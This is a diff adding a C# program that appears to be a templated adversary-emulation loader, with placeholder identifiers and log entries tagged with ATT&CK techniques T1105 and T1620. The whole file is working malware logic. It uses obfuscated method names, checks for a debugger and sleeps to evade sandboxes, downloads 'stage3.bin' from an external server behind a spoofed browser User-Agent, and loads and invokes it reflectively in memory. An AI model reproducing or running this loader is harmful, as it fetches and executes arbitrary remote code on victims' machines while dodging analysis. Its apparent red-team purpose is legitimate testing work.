@@ -1,0 +1,79 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+public class Xq1 {
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetCurrentProcess();
+    
+    [DllImport("kernel32.dll")]
+    private static extern bool IsDebuggerPresent();
+    
+    [DllImport("kernel32.dll")]
+    private static extern void Sleep(uint dwMilliseconds);
+    
+    private static bool Lp2() {
+        if (IsDebuggerPresent()) return false;
+        
+        string y3k = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\{PHR_SIMULATION_ID}";
+        if (!Directory.Exists(y3k)) Directory.CreateDirectory(y3k);
+        
+        return true;
+    }
+    
+    private static byte[] T7m() {
+        try {
+            using (WebClient wc = new WebClient()) {
+                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                wc.Proxy = WebRequest.GetSystemWebProxy();
+                return wc.DownloadData("http://{PHR_EXTERNAL_SERVER_URL}/stage3.bin");
+            }
+        }
+        catch { return null; }
+    }
+    
+    private static bool Z9p(byte[] data) {
+        try {
+            Assembly asm = Assembly.Load(data);
+            MethodInfo entry = asm.EntryPoint;
+            if (entry != null) {
+                object[] parameters = entry.GetParameters().Length > 0 ? new object[] { new string[0] } : null;
+                entry.Invoke(null, parameters);
+                return true;
+            }
+            return false;
+        }
+        catch { return false; }
+    }
+    
+    private static void K4r(string msg) {
+        try {
+            string logPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\{PHR_SIMULATION_ID}\\Timestamp-Log.txt";
+            File.AppendAllText(logPath, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + ": " + msg + Environment.NewLine);
+        }
+        catch { }
+    }
+    
+    public static void Main() {
+        Sleep(8000);
+        if (!Lp2()) return;
+        
+        Thread.Sleep(new Random().Next(2000, 5000));
+        
+        byte[] stage3 = T7m();
+        if (stage3 != null && stage3.Length > 0) {
+            K4r("{PHR_SIMULATION_ID}-T1105=1");
+            
+            if (Z9p(stage3)) {
+                K4r("{PHR_SIMULATION_ID}-T1620=1");
+            } else {
+                K4r("{PHR_SIMULATION_ID}-T1620=0");
+            }
+        } else {
+            K4r("{PHR_SIMULATION_ID}-T1105=0");
+        }
+    }
+}
